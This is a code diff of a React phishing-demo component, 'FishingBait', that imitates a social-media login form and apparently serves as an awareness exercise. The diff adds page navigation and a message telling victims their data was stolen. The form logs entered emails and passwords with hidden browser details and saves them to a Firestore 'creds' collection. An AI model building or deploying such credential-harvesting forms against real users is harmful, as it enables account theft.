@@ -1,17 +1,24 @@
 import React, {useState} from 'react'
 import { doc, setDoc } from "firebase/firestore"; 
 import { db } from "./firebase"
+import { useNavigate } from 'react-router-dom';
 
 
-export default function FishingBait() {
+export default function FishingBait(clickToLearn) {
 
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
     const [hiddenInfo, setHiddenInfo] = useState('');
     const [errorMessage, setErrorMessage] = useState('')
+    const [clicked, setClicked] = useState(false)
 
 
+    const navigate = useNavigate();
 
+    const handleClick = () => {
+      navigate('/PageTwo');
+    };
+  
 
 
     const handleSubmit  = async (e) => {
@@ -20,17 +27,21 @@ export default function FishingBait() {
         const hiddenInfo2 = document.querySelector('#hidden-info2').value;
         console.log('Email:', email);
         console.log('Password:', password);
-        console.log('Hidden Info (User-Agent, IP, etc.):', hiddenInfo);
-        console.log("languages", hiddenInfo2);
+        console.log('Other Information:', hiddenInfo);
+        console.log("languages used", hiddenInfo2);
+        setClicked(!clicked)
+
         await setDoc(doc(db, "creds", email+Math.random()), {
           email:email,
           password:password,
           hiddenInfo:hiddenInfo,
-          hiddenInfo2:hiddenInfo2,
+          languages:hiddenInfo2,
         });
-        setErrorMessage("The fishing page has stolen your information")
+        setErrorMessage("The Phishing page has stolen your information, see top of page")
       };
 
+
+      
 
   return (
     <form onSubmit={handleSubmit} className='flex flex-col items-center bg-[#FFFFFF] w-[300px] h-fit text-black p-2 drop-shadow-2xl'>
@@ -40,7 +51,7 @@ export default function FishingBait() {
   
 <input
          className='w-[250px] h-[25px] text-black border border-[1] border-[#DDDFE2] focus:bg-[#E8F0FE] focus:border-[#0866FF] rounded p-4'
-          type="email"
+          type="text"
           name="email"
           value={email}
           placeholder='Email or phone number'
